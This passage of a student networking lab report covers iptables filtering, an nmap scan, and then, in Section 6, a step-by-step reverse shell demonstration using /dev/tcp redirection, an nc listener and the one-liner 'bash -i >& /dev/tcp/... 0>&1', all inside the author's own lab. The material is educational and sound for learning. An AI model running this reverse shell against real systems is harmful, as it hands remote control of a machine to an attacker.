To test blocking, all traffic from PC2 (192.168.200.100) was prohibited.
textstudent@student:~$ sudo iptables -A INPUT -s 192.168.200.100 -j DROP
student@student:~$
Rules verification:
textstudent@student:~$ sudo iptables -L -v
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:https
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:http
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh
    0     0 DROP       all  --  any    any     192.168.200.100      anywhere

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
student@student:~$
5.4 Blocking Verification
Ping from PC2 to Server failed (no response), confirming silent packet drop by firewall.
textstudent@student:/etc/network$ ping 192.168.100.2
PING 192.168.100.2 (192.168.100.2) 56(84) bytes of data.
5.5 Configuration Persistence
iptables rules are lost on reboot; saving is essential. We used iptables-save > /etc/iptables.rules to export, restorable on startup.
textstudent@student:~$ sudo sh -c "iptables-save > /etc/epitables.rules"
5.6 Port Analysis (Nmap Scan)
Port scan from PC1 to Server verified visible services through firewall using nmap 192.168.100.2.
textstudent@student:/etc/network$ nmap 192.168.100.2

Starting Nmap 6.40 ( http://nmap.org ) at 2026-02-01 19:14 CET
Nmap scan report for 192.168.100.2
Host is up (0.013s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http

Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds
student@student:/etc/network$
Results:

Port 22 (tcp) OPEN (SSH accessible).
Port 80 (tcp) OPEN (HTTP accessible).

This confirms acceptance rules function correctly.
5.7 Filter Deactivation
Access for PC2 was restored by deleting the blocking rule.
textstudent@student:~$ sudo iptables -D INPUT -s 192.168.200.100 -j DROP
student@student:~$ sudo iptables -L -v
Chain INPUT (policy ACCEPT 5 packets, 420 bytes)
 pkts bytes target     prot opt in     out     source               destination
    4   240 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:https
   12   656 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:http
    6   328 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination

Chain OUTPUT (policy ACCEPT 5 packets, 420 bytes)
 pkts bytes target     prot opt in     out     source               destination
student@student:~$
Post-command, PC2 ping succeeded.
textstudent@student:/etc/network$ ping 192.168.100.2
PING 192.168.100.2 (192.168.100.2) 56(84) bytes of data.
64 bytes from 192.168.100.2: icmp_seq=1 ttl=63 time=4.75 ms
64 bytes from 192.168.100.2: icmp_seq=2 ttl=63 time=9.38 ms
64 bytes from 192.168.100.2: icmp_seq=3 ttl=63 time=6.91 ms
64 bytes from 192.168.100.2: icmp_seq=4 ttl=63 time=6.15 ms
64 bytes from 192.168.100.2: icmp_seq=5 ttl=63 time=6.14 ms
^C
--- 192.168.100.2 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4009ms
rtt min/avg/max/mdev = 4.756/6.669/9.388/1.529 ms
student@student:/etc/network$
Section 6: Exploitation and Reverse Shell
6.1 Establishing a Simple Communication Channel
We first set up a raw TCP connection between the server (listening on port 9090 with nc -l) and client.

Client Command: echo hamdani-mohammed > /dev/tcp/192.168.100.2/9090
Observation: "hamdani-mohammed" appeared on the server terminal, confirming TCP channel functionality.

textstudent@student:~$ nc -l 9090 -v
Listening on [0.0.0.0] (family 0, port 9090)
textstudent@student:/etc/network$ echo hamdani-mohammed > /dev/tcp/192.168.100.2/9090
student@student:/etc/network$
textstudent@student:~$ nc -l 9090 -v
Listening on [0.0.0.0] (family 0, port 9090)
Connection from [192.168.200.100] port 9090 [tcp/*] accepted (family 2, sport 37518)
hamdani-mohammed
student@student:~$
6.2 Simple Redirection Analysis
We attempted to redirect a bash shell execution to the TCP channel.
Command: /bin/bash > /dev/tcp/192.168.100.2/9090 followed by ls -al.
Observation: ls -al was typed on the client, but results appeared on the server terminal, not client's.
textstudent@student:/etc/network$ echo hamdani-mohammed > /dev/tcp/192.168.100.2/9090
student@student:/etc/network$ /bin/bash > /dev/tcp/192.168.100.2/9090
student@student:/etc/network$
textstudent@student:/etc/network$ /bin/bash > /dev/tcp/192.168.100.2/9090
student@student:/etc/network$ ls -al
student@student:/etc/network$
Server Result:
textstudent@student:~$ nc -l 9090 -v
Listening on [0.0.0.0] (family 0, port 9090)
Connection from [192.168.200.100] port 9090 [tcp/*] accepted (family 2, sport 37520)
total 40
drwxr-xr-x  7 root root  4096 mars   5  2019 .
drwxr-xr-x 130 root root 12288 févr.  1 12:48 ..
drwxr-xr-x  2 root root  4096 mars   5  2019 if-down.d
drwxr-xr-x  2 root root  4096 mars   5  2019 if-post-down.d
drwxr-xr-x  2 root root  4096 mars   5  2019 if-pre-up.d
drwxr-xr-x  2 root root  4096 mars   5  2019 if-up.d
-rw-r--r--  1 root root   114 févr.  1 17:03 interfaces
drwxr-xr-x  2 root root  4096 avril  4  2014 interfaces.d
lrwxrwxrwx  1 root root    12 nov.  20  2020 run -> /run/network
This is due to Linux standard stream management:

Standard Output (stdout, descriptor 1) redirected to server TCP socket, so server sees results.
Standard Input (stdin, descriptor 0) remained on client keyboard.
Thus, a one-way shell (Semi-Bind Shell): attacker views activity but cannot send commands.

6.3 Error Stream Manipulation
To capture all outputs (including errors), we created test.sh with intentional syntax error.
text#!/bin/bash
i=0
echo $i
read j
echo $j
while [ $i -lt 3
do
i=$[i+1]
done
Command used:
text./test.sh > ofile 2>&1
textstudent@student:~$ ./test.sh > ofile 2>&1
1
student@student:~$ cat ofile
0
1
./test.sh: line 6: [: missing `]'
student@student:~$
Command explanation: Double redirection:
ofile: Redirects stdout to ofile.
2>&1: Redirects stderr (descriptor 2) to stdout's current location (ofile). Thus, ofile holds normal execution and errors—crucial for full Reverse Shell to detect command failures.
6.4 Full Reverse Shell Implementation
Combining insights, we gained total control over PC2.

Preparation: Created witness files (hamdani.txt, etc.) on client.

text./test.sh: line 6: [: missing ]
student@student:~$ touch hamdani.txt hamdani1.txt hamdani2.txt
student@student:~$

Attack: Executed Reverse Shell on client:

textbash -i >& /dev/tcp/192.168.100.2/9090 0>&1
textstudent@student:~$ bash -i >& /dev/tcp/192.168.100.2/9090 0>&1
Result: Server gained full client terminal access. Executed ls from server, viewing PC2 files (hamdani.txt, hamdani1.txt), confirming exploitation success.
textstudent@student:~$ ls
ls
Desktop
Documents
Downloads
examples.desktop
hamdani1.txt
hamdani2.txt
hamdani.txt
Music
ofile
Pictures
Public
Templates
test.sh
Videos
student@student:~$
Conclusion
This project enabled the implementation of a complete and secure network infrastructure on Linux. Key achievements include:

Network virtualization (VM creation and cloning).
Static routing and network segmentation.
Administration of essential services (DHCP and Apache Web Server).
Defensive security through packet filtering (iptables).
Insight into offensive mechanisms via stream redirection exploitation (Reverse Shell).

These efforts form the foundational elements of system administration and network security.